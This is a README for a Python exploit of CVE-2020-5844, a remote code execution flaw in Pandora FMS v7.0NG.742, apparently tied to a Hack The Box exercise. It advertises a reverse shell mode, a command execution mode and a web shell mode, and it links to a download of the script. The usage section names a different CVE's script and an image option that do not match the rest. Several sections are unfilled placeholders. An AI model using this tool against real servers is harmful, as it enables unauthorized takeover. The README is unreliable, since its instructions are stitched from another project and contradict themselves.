# Exploit for CVE-2020-5844 (Pandora FMS) - Remote Code Execution
For educational and authorized security research purposes only.
```
              _ __,~~~/_     ______   ______    ___  ___  ___  ___      ____ ___  ____ ____
          ,~~`( )_( )-\|    / ___/ | / / __/___|_  |/ _ \|_  |/ _ \____/ __/( _ )/ / // / /
              |/|  `--.    / /__ | |/ / _//___/ __// // / __// // /___/__ \/ _  /_  _/_  _/
              ! !  !       \___/ |___/___/   /____/\___/____/\___/   /____/\___/ /_/  /_/
```

**Like this repo? Give us a ‚≠ê!**

## Exploit Author
[@UNICORDev](https://unicord.dev) by ([@NicPWNs](https://github.com/NicPWNs) and [@Dev-Yeoj](https://github.com/Dev-Yeoj))

## Vulnerability Description
index.php?sec=godmode/extensions&sec2=extensions/files_repo in Pandora FMS v7.0 NG allows authenticated administrators to upload malicious PHP scripts, and execute them via base64 decoding of the file location. This affects v7.0NG.742_FIX_PERL2020.

## Exploit Description
Our description.

## Usage
```bash
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h
```

## Options
```bash
  -t    Target host and port. Provide target IP address and port.
  -u    Target username and password. Provide username and password to log in to Pandora FMS.
  -p    Target valid PHP session ID. No username or password needed. (Optional)
  -s    Reverse shell mode. Provide local IP address and port. (Optional)
  -c    Custom command mode. Provide command to execute. (Optional)
  -w    Web shell custom mode. Provide custom PHP file name. (Optional)
  -h    Show this help menu.
```

## Download
[Download exploit-CVE-2020-5844.py Here](https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2020-5844/main/exploit-CVE-2020-5844.py)

## Exploit Requirements
- python3
- python3:requests

## Demo
### Default Mode with Username and Password

### Default Mode with PHPSESSID

### Custom Command Mode

### Reverse Shell Mode

## Custom Web Shell Name Mode

## Tested On
Pandora FMS v7.0NG.742

## Applies To
Pandora FMS v7.0NG.742

## Test Environment
```bash
apt install X
```

## Credits
- https://nvd.nist.gov/vuln/detail/CVE-2020-5844
- https://app.hackthebox.com/machines/pandora
- https://github.com/TheCyberGeek/CVE-2020-5844
- https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated